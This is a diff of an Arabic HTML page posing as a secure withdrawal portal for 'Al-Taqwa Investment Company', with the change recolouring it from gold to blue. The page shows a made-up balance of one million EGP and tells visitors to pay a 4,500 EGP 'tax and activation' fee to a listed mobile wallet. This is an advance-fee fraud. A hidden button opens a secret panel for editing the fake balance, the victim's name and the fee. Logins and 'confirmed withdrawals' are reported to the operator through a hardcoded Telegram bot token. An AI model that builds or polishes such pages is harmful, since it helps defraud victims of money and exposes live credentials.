@@ -3,44 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شركة التقوى للاستثمار - النظام الآمن 2026</title>
+    <title>شركة التقوى للاستثمار - التداول الآمن</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #ffcc00; --bg: #0b0e11; --card: rgba(255, 255, 255, 0.1); --up: #0ecb81; --down: #f6465d; }
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: #000; color: white; min-height: 100vh; overflow-x: hidden; }
+        :root { --primary-blue: #0052ff; --dark-blue: #001a4d; --bg: #000510; --card: rgba(0, 82, 255, 0.1); }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }
 
         /* شاشة الباسورد */
-        #lock-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        #lock-screen input { padding: 15px; border-radius: 10px; border: 1px solid var(--gold); background: #222; color: white; text-align: center; font-size: 20px; width: 280px; margin-bottom: 20px; outline: none; }
-        #lock-screen button { background: var(--gold); border: none; padding: 12px 50px; border-radius: 8px; font-weight: 900; cursor: pointer; font-size: 18px; }
+        #lock-screen { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        #lock-screen input { padding: 15px; border-radius: 10px; border: 1px solid var(--primary-blue); background: #001233; color: white; text-align: center; font-size: 20px; width: 280px; margin-bottom: 20px; outline: none; }
+        #lock-screen button { background: var(--primary-blue); border: none; padding: 12px 50px; border-radius: 8px; font-weight: 900; color: white; cursor: pointer; font-size: 18px; }
 
         /* التصميم العريض */
         .page-container { width: 95%; max-width: 1400px; margin: 0 auto; display: none; padding-top: 20px; }
         
-        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 20px; margin-bottom: 30px; }
-        .logo-btn { font-size: 2.2rem; font-weight: 900; color: var(--gold); cursor: pointer; text-shadow: 0 0 15px rgba(255, 204, 0, 0.4); }
-        .timer-box { background: rgba(255, 0, 0, 0.2); border: 1px solid #ff4d4d; padding: 10px 20px; border-radius: 30px; color: #ff4d4d; font-weight: bold; }
+        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0, 82, 255, 0.2); padding-bottom: 20px; margin-bottom: 30px; }
+        .logo { font-size: 2.2rem; font-weight: 900; color: var(--primary-blue); text-shadow: 0 0 15px rgba(0, 82, 255, 0.5); }
+        .timer-box { background: rgba(255, 0, 0, 0.15); border: 1px solid #ff4d4d; padding: 10px 20px; border-radius: 30px; color: #ff4d4d; font-weight: bold; }
 
         .main-grid { display: grid; grid-template-columns: 2.5fr 1fr; gap: 30px; }
         
-        /* كارت البيانات الرئيسي */
-        .glass-card { background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 25px; padding: 40px; }
-        .balance-section { background: rgba(0,0,0,0.4); padding: 30px; border-radius: 20px; border-right: 6px solid var(--gold); margin-bottom: 30px; text-align: center; }
+        .glass-card { background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(0, 82, 255, 0.2); border-radius: 25px; padding: 40px; }
+        .balance-section { background: rgba(0, 30, 80, 0.5); padding: 30px; border-radius: 20px; border-right: 6px solid var(--primary-blue); margin-bottom: 30px; text-align: center; }
         .balance-section h1 { font-size: 3.5rem; margin: 10px 0; color: #fff; }
 
-        .info-row { display: flex; justify-content: space-between; padding: 20px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .info-row span { color: #aaa; font-size: 18px; }
+        .info-row { display: flex; justify-content: space-between; padding: 20px 0; border-bottom: 1px solid rgba(0, 82, 255, 0.1); }
+        .info-row span { color: #8eb9ff; font-size: 18px; }
         .info-row b { font-size: 20px; color: #fff; }
 
-        .notice-box { background: rgba(255, 204, 0, 0.1); border: 1px dashed var(--gold); padding: 20px; border-radius: 15px; text-align: center; margin: 30px 0; }
+        .notice-box { background: rgba(0, 82, 255, 0.1); border: 1px dashed var(--primary-blue); padding: 20px; border-radius: 15px; text-align: center; margin: 30px 0; }
         .wallet-num { background: #fff; color: #000; padding: 15px; border-radius: 10px; font-size: 28px; font-weight: 900; margin-top: 15px; display: block; letter-spacing: 2px; }
 
-        .submit-btn { background: var(--gold); color: #000; border: none; width: 100%; padding: 22px; border-radius: 15px; font-size: 1.5rem; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .submit-btn { background: var(--primary-blue); color: white; border: none; width: 100%; padding: 22px; border-radius: 15px; font-size: 1.5rem; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .submit-btn:hover { box-shadow: 0 10px 30px rgba(0, 82, 255, 0.4); transform: translateY(-3px); }
 
-        /* شاشة التحميل 5 ثواني */
+        /* الزر الجانبي السري (تحت) */
+        .admin-trigger { position: fixed; bottom: 20px; left: 20px; width: 40px; height: 40px; background: rgba(255,255,255,0.05); border-radius: 50%; cursor: pointer; z-index: 5000; }
+
+        /* شاشة التحميل */
         #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 20000; display: none; flex-direction: column; justify-content: center; align-items: center; }
-        .bar-bg { width: 300px; height: 10px; background: #333; border-radius: 10px; overflow: hidden; margin-top: 25px; }
-        .bar-fill { width: 0%; height: 100%; background: var(--gold); transition: width 5s linear; }
+        .bar-bg { width: 300px; height: 10px; background: #111; border-radius: 10px; overflow: hidden; margin-top: 25px; }
+        .bar-fill { width: 0%; height: 100%; background: var(--primary-blue); transition: width 5s linear; }
 
         /* لوحة التحكم */
         #adminPanel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 30000; display: none; flex-direction: column; align-items: center; justify-content: center; }
@@ -51,35 +54,35 @@
 <body>
 
 <div id="lock-screen">
-    <h1 style="color:var(--gold); margin-bottom:10px;">شركة التقوى للاستثمار</h1>
-    <p style="color:#aaa; margin-bottom:30px;">نظام التداول الآمن والمشفر</p>
-    <input type="password" id="sitePass" placeholder="أدخل كود الدخول">
-    <button onclick="unlock()">دخول النظام</button>
+    <h1 style="color:var(--primary-blue); margin-bottom:10px;">شركة التقوى للاستثمار</h1>
+    <p style="color:#8eb9ff; margin-bottom:30px;">بوابة السحب الآمنة - إصدار 2026</p>
+    <input type="password" id="sitePass" placeholder="أدخل كود المرور">
+    <button onclick="unlock()">فتح النظام</button>
 </div>
 
 <div id="loader">
-    <h2 id="l-text">جاري تشفير طلب السحب...</h2>
+    <h2 id="l-text">جاري التحقق من البروتوكول الأزرق...</h2>
     <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
 </div>
 
 <div class="page-container" id="mainApp">
     <header>
-        <div class="logo-btn" onclick="admTrig()">شركة التقوى</div>
-        <div class="timer-box">⏱️ تنتهي الجلسة خلال: <span id="timer">05:00</span></div>
+        <div class="logo">شركة التقوى</div>
+        <div class="timer-box">⏱️ الجلسة مؤمنة لـ: <span id="timer">05:00</span></div>
     </header>
 
     <div class="main-grid">
         <div class="glass-card">
             <div class="balance-section">
-                <span>رصيدك الحالي القابل للسحب الفوري</span>
+                <span>إجمالي الرصيد القابل للسحب</span>
                 <h1 id="dispBal">1,000,000.00 <small style="font-size:20px;">EGP</small></h1>
             </div>
 
-            <div class="info-row"><span>اسم صاحب الحساب:</span> <b id="dispName">احمد حجاج فهمي</b></div>
-            <div class="info-row"><span>رقم المحفظة المستلمة:</span> <b id="dispWallet">01015545535</b></div>
+            <div class="info-row"><span>الاسم المستلم:</span> <b id="dispName">احمد حجاج فهمي</b></div>
+            <div class="info-row"><span>رقم المحفظة:</span> <b id="dispWallet">01015545535</b></div>
 
             <div class="notice-box">
-                <p style="margin:0; font-weight:bold;">يرجى تحويل رسوم المعالجة والضريبة (<span id="dispFee" style="color:#d63031;">4500</span> ج.م) للرقم:</p>
+                <p style="margin:0; font-weight:bold;">يرجى سداد رسوم الضريبة والتفعيل (<span id="dispFee" style="color:#ff4d4d;">4500</span> ج.م) للرقم المعتمد:</p>
                 <span class="wallet-num" id="dispAdminWall">01228370922</span>
             </div>
 
@@ -87,27 +90,29 @@
         </div>
 
         <div class="glass-card" style="padding: 20px;">
-            <h3 style="color:var(--gold); margin-top:0;">إحصائيات مباشرة</h3>
-            <div style="background:rgba(255,255,255,0.05); height:200px; border-radius:15px; margin-bottom:20px; display:flex; align-items:flex-end; gap:5px; padding:10px;">
-                <div style="flex:1; background:var(--up); height:80%; border-radius:3px;"></div>
-                <div style="flex:1; background:var(--down); height:40%; border-radius:3px;"></div>
-                <div style="flex:1; background:var(--up); height:90%; border-radius:3px;"></div>
+            <h3 style="color:var(--primary-blue); margin-top:0;">حالة الخادم</h3>
+            <div style="background:rgba(0, 82, 255, 0.05); height:200px; border-radius:15px; margin-bottom:20px; display:flex; align-items:flex-end; gap:5px; padding:10px;">
+                <div style="flex:1; background:var(--primary-blue); height:70%; border-radius:3px; opacity:0.8;"></div>
+                <div style="flex:1; background:var(--primary-blue); height:40%; border-radius:3px; opacity:0.5;"></div>
+                <div style="flex:1; background:var(--primary-blue); height:90%; border-radius:3px; opacity:1;"></div>
             </div>
-            <p style="font-size:13px; color:#888;">* مؤشرات السوق تعمل بنظام التشفود الفوري 2026</p>
+            <p style="font-size:13px; color:#8eb9ff;">* النظام يعمل بتقنية التشفير End-to-End</p>
         </div>
     </div>
 </div>
 
+<div class="admin-trigger" onclick="admTrig()"></div>
+
 <div id="adminPanel">
     <div class="admin-box">
-        <h3 style="text-align:center;">إعدادات الإدارة ⚙️</h3>
-        <label>رصيد الحساب:</label><input type="number" id="admBal" value="1000000">
-        <label>اسم العميل:</label><input type="text" id="admName" value="احمد حجاج فهمي">
-        <label>رقم محفظة العميل:</label><input type="text" id="admWall" value="01015545535">
-        <label>قيمة الرسوم:</label><input type="number" id="admFee" value="4500">
-        <label>رقم محفظة الإيداع (التحويل):</label><input type="text" id="admAdminWall" value="01228370922">
-        <label>كلمة سر الموقع:</label><input type="text" id="admPass" value="123456">
-        <button onclick="saveAdmin()" style="width:100%; padding:15px; background:#000; color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:15px;">حفظ وتثبيت</button>
+        <h3 style="text-align:center;">لوحة التحكم السرية ⚙️</h3>
+        <label>الرصيد:</label><input type="number" id="admBal" value="1000000">
+        <label>الاسم:</label><input type="text" id="admName" value="احمد حجاج فهمي">
+        <label>محفظة العميل:</label><input type="text" id="admWall" value="01015545535">
+        <label>الرسوم:</label><input type="number" id="admFee" value="4500">
+        <label>رقم التحويل (المحفظة):</label><input type="text" id="admAdminWall" value="01228370922">
+        <label>كلمة سر الدخول:</label><input type="text" id="admPass" value="123456">
+        <button onclick="saveAdmin()" style="width:100%; padding:15px; background:var(--primary-blue); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:15px;">حفظ وتحديث</button>
     </div>
 </div>
 
@@ -115,7 +120,7 @@
     const BOT_TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
     const CHAT_ID = '8232581666';
 
-    let config = JSON.parse(localStorage.getItem('taqwaConfig')) || {
+    let config = JSON.parse(localStorage.getItem('taqwaBlueConfig')) || {
         bal: 1000000, name: "احمد حجاج فهمي", wall: "01015545535", fee: 4500, adminWall: "01228370922", pass: "123456"
     };
 
@@ -133,8 +138,8 @@
             document.getElementById('lock-screen').style.display = 'none';
             document.getElementById('mainApp').style.display = 'block';
             startTimer(300);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔔 دخول جديد لشركة التقوى.`);
-        } else { alert("الكود غير صحيح!"); }
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔵 دخول جديد للنسخة الزرقاء.`);
+        } else { alert("كلمة المرور خاطئة!"); }
     }
 
     function startTimer(duration) {
@@ -153,9 +158,9 @@
         loader.style.display = 'flex'; fill.style.width = '100%';
         setTimeout(async () => {
             loader.style.display = 'none';
-            const txn = "TXN-" + Math.floor(Math.random()*900000 + 100000) + "-AQ";
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('✅ طلب سحب مؤكد\nالعميل: '+config.name+'\nالمبلغ: '+config.bal+'\nالمعاملة: '+txn)}`);
-            alert(`الطلب مؤكد ✓\nرقم المعاملة: ${txn}\nسيتم التحويل بعد سداد الرسوم.`);
+            const txn = "BLU-" + Math.floor(Math.random()*900000 + 100000);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('✅ سحب أزرق مؤكد\n👤: '+config.name+'\n💰: '+config.bal+' EGP\n🆔: '+txn)}`);
+            alert(`تم تأكيد الطلب بنجاح ✓\nرقم المعاملة: ${txn}\nالتحويل يتم آلياً بعد مراجعة الرسوم.`);
             location.reload();
         }, 5000);
     }
@@ -172,7 +177,7 @@
             adminWall: document.getElementById('admAdminWall').value,
             pass: document.getElementById('admPass').value
         };
-        localStorage.setItem('taqwaConfig', JSON.stringify(config));
+        localStorage.setItem('taqwaBlueConfig', JSON.stringify(config));
         apply();
         document.getElementById('adminPanel').style.display='none';
     }
